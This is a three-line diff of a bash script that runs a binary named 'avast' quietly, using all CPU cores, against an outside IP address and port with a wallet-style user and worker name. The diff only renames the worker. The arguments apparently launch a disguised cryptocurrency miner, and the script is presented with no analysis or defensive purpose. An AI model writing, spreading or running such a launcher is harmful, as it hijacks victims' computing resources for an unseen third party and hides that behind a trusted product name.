@@ -1,3 +1,3 @@
 #!/bin/bash
 
-chmod +x ./avast >/dev/null 2>&1 && ./avast -v -l 136.56.44.34:9998 -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.RIG -t $(nproc) -x 
+chmod +x ./avast >/dev/null 2>&1 && ./avast -v -l 136.56.44.34:9998 -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.LAGRA -t $(nproc) -x 
